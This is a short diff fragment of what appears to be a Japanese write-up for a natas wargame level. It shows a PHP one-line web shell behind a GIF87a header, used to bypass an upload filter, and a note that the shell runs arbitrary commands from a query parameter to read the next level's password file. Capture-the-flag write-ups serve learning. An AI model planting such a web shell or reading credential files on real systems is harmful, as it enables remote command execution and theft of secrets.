@@ -106,3 +106,4 @@ GIF87a
 <?php system($_GET["cmd"]);?>
 ```
 
+クエリのパラメータから好きなコマンドを実行できるので`/etc/natas_webpass/natas14`をcatしてクリア
